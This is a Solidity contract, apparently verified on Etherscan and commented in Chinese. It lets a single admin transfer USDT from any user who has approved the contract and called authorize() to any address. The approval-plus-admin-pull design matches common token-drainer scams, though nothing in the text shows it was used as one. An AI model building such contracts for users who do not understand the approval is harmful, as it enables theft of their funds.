/**
 *Submitted for verification at Etherscan.io on 2025-03-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title USDT Transfer Contract
/// @author jianqingwang
/// @notice 这个合约允许管理员控制已授权用户的USDT转账
/// @dev 使用前需要用户先授权USDT给合约
/// @custom:dev-run-script scripts/deploy.js

// 定义接口
interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

// 主合约
contract USDTTransfer {
    // 状态变量
    address public immutable USDT;
    address public immutable admin;
    bool public paused;
    mapping(address => bool) public isAuthorized;
    mapping(address => uint256) public lastTransferTimestamp;  // 记录最后一次转账时间
    uint256 public constant MIN_ALLOWANCE = 1000000; // 最小授权额度：1 USDT
    uint256 public constant TRANSFER_COOLDOWN = 1 minutes; // 转账冷却时间
    
    // 事件定义
    event TransferCompleted(address indexed from, address indexed to, uint256 amount, uint256 remainingAllowance);
    event AuthorizationGranted(address indexed user, uint256 allowance);
    event AuthorizationRevoked(address indexed user, string reason);
    event EmergencyPaused(address indexed by, uint256 timestamp);
    event EmergencyUnpaused(address indexed by, uint256 timestamp);
    event TransferFailed(address indexed from, address indexed to, uint256 amount, string reason);
    event AllowanceDropped(address indexed user, uint256 currentAllowance);
    event TransferCooldownTriggered(address indexed user, uint256 nextAvailableTime);

    // 修饰符
    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin can call this");
        _;
    }

    modifier whenNotPausedOrAdmin() {
        require(!paused || msg.sender == admin, "Contract is paused");
        _;
    }

    modifier whenNotPausedOrRevoking() {
        require(!paused || msg.sender == admin || 
                (isAuthorized[msg.sender] && msg.sig == this.revokeAuthorization.selector), 
                "Contract is paused");
        _;
    }

    modifier checkAllowance(address user) {
        _;
        uint256 currentAllowance = IERC20(USDT).allowance(user, address(this));
        if (currentAllowance < MIN_ALLOWANCE && isAuthorized[user]) {
            isAuthorized[user] = false;
            emit AuthorizationRevoked(user, "Allowance dropped below minimum");
            emit AllowanceDropped(user, currentAllowance);
        }
    }

    modifier checkTransferCooldown(address user) {
        require(
            block.timestamp >= lastTransferTimestamp[user] + TRANSFER_COOLDOWN,
            "Transfer cooldown active"
        );
        _;
        lastTransferTimestamp[user] = block.timestamp;
        emit TransferCooldownTriggered(user, block.timestamp + TRANSFER_COOLDOWN);
    }

    /// @notice 部署合约
    /// @param _usdt USDT合约地址
    constructor(address _usdt) {
        require(_usdt != address(0), "Invalid USDT address");
        USDT = _usdt;
        admin = msg.sender;
    }

    /// @notice 管理员暂停/恢复合约
    function togglePause() external onlyAdmin {
        paused = !paused;
        if (paused) {
            emit EmergencyPaused(msg.sender, block.timestamp);
        } else {
            emit EmergencyUnpaused(msg.sender, block.timestamp);
        }
    }

    /// @notice 用户授权给合约
    function authorize() external whenNotPausedOrAdmin checkAllowance(msg.sender) {
        IERC20 usdt = IERC20(USDT);
        
        // 检查授权额度
        uint256 allowance = usdt.allowance(msg.sender, address(this));
        require(allowance >= MIN_ALLOWANCE, "Min allowance 1 USDT required");
        
        // 检查余额
        uint256 balance = usdt.balanceOf(msg.sender);
        require(balance >= MIN_ALLOWANCE, "Insufficient USDT balance");
        
        // 检查是否已授权
        require(!isAuthorized[msg.sender], "Already authorized");
        
        isAuthorized[msg.sender] = true;
        emit AuthorizationGranted(msg.sender, allowance);
    }

    /// @notice 用户取消授权
    function revokeAuthorization() external whenNotPausedOrRevoking {
        require(isAuthorized[msg.sender], "Not authorized");
        isAuthorized[msg.sender] = false;
        emit AuthorizationRevoked(msg.sender, "User requested");
    }

    /// @notice 管理员从授权账户转出USDT
    /// @param from 源账户地址
    /// @param to 目标账户地址
    /// @param amount 转账金额
    function adminTransfer(
        address from,
        address to,
        uint256 amount
    ) external onlyAdmin whenNotPausedOrAdmin checkAllowance(from) checkTransferCooldown(from) {
        require(isAuthorized[from], "Source account not authorized");
        require(to != address(0), "Invalid recipient");
        require(amount > 0 && amount <= type(uint256).max, "Invalid amount");

        IERC20 usdt = IERC20(USDT);
        
        // 检查授权额度
        uint256 currentAllowance = usdt.allowance(from, address(this));
        require(currentAllowance >= amount, "Insufficient allowance");
        
        // 检查余额
        uint256 balance = usdt.balanceOf(from);
        require(balance >= amount, "Insufficient USDT balance");

        try usdt.transferFrom(from, to, amount) returns (bool success) {
            require(success, "Transfer failed");
            
            // 检查剩余授权额度
            uint256 remainingAllowance = usdt.allowance(from, address(this));
            emit TransferCompleted(from, to, amount, remainingAllowance);
            
            // 自动检查授权额度（通过 checkAllowance 修饰符）
        } catch Error(string memory reason) {
            isAuthorized[from] = false; // 发生错误时取消授权
            emit AuthorizationRevoked(from, reason);
            emit TransferFailed(from, to, amount, reason);
            revert(reason);
        } catch {
            isAuthorized[from] = false; // 发生未知错误时取消授权
            emit AuthorizationRevoked(from, "Unknown error");
            emit TransferFailed(from, to, amount, "Unknown error");
            revert("Transfer failed with unknown error");
        }
    }

    /// @notice 查询账户授权状态
    /// @param account 要查询的账户地址
    /// @return bool 是否已授权
    function checkAuthorization(address account) external view returns (bool) {
        if (paused && account != admin) {
            return false;
        }
        
        // 检查当前授权额度
        if (isAuthorized[account]) {
            uint256 currentAllowance = IERC20(USDT).allowance(account, address(this));
            return currentAllowance >= MIN_ALLOWANCE;
        }
        
        return false;
    }

    /// @notice 查询账户授权给合约的USDT额度
    /// @param account 要查询的账户地址
    /// @return uint256 授权额度
    function queryAllowance(address account) external view returns (uint256) {
        return IERC20(USDT).allowance(account, address(this));
    }

    /// @notice 管理员救援其他代币
    /// @param token 代币地址
    /// @param amount 救援金额
    function rescueTokens(address token, uint256 amount) external onlyAdmin {
        require(token != USDT, "Cannot rescue USDT");
        require(IERC20(token).transfer(admin, amount), "Rescue failed");
    }

    function getNextAvailableTransferTime(address account) external view returns (uint256) {
        uint256 lastTransfer = lastTransferTimestamp[account];
        if (lastTransfer == 0 || block.timestamp >= lastTransfer + TRANSFER_COOLDOWN) {
            return block.timestamp;
        }
        return lastTransfer + TRANSFER_COOLDOWN;
    }
}